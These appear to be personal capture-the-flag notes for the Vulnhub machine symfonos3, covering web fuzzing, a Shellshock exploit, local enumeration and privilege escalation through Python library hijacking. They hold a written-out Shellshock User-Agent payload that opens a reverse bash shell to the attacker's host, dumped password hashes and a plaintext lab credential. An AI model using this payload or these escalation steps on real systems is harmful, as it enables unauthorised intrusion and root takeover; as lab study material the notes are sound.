```
000005172:   403        9 L      28 W       277 Ch      "wp-forum.phps"                                                                  
<http://192.168.1.48/gate/cerberus/tartarus/research>
cgi-bin dir gave 403, but found underworld with 200 response behind it
<http://symfonos3.local/cgi-bin/underworld>

<https://www.exploit-db.com/docs/48112>
(nc version did not work, but bash did)

User-Agent: () { :;}; /bin/bash -c 'exec bash -i &>/dev/tcp/192.168.1.42/443 <&1'

====
PRIVESC

suid

check for cap later
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 47 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd         
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 117 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04

locate phpsessionclean.timer

tcpdump -i lo
(tcpdmp didnt work cuz of some mistake, mby with my virtualbox conf, unsure)

would find creds due to ftp being an unencrypted protocol

### hades:PTpZTfU4vxgzvRBE

ssh hades@192.168.1.48

So now we see if can perform library hijacking. 


So we cannot write or execute this file, but we are apparently allowed to move it. Should be innocent enough, right? Right? ;))))


Edit new file:
Now, since we know root is running python 2.7 and executing the ftpclient.py script, which again, contains ftplib as a library, we can hijack that library path given our group permissions. 


And we are root, yummy ;)
```

![unnamed_bad923b5e929466ba22d2c829993deaf](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011742.png)
![unnamed_0f4727ec436e4e8fbada0e0f1674daa6](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011742-1.png)
![unnamed_dd0a3fbcc44b4c8284440f250a717f6e](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011742-2.png)
![unnamed_01a0684f9c854ae0a79d7896d73febac](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743.png)
![unnamed_c94402fdd5f84a13b9e852a59f6577b3](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743-1.png)
![unnamed_9571f521e08f488cb19ae2ec07baf196](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743-2.png)
![unnamed_d44f4f8985d44387a33986a153badc6f](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743-3.png)
![unnamed_ec51da81b4e942bf91ed9f72a3489eac](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743-4.png)
![unnamed_ceb884b3d01242a2bae92ba2d1f67d3a](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743-5.png)
![unnamed_fb6bb12a84bb4ffab771125e80be0b1f](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/symfonos3/notes/{{notename}}-202605011743-6.png)

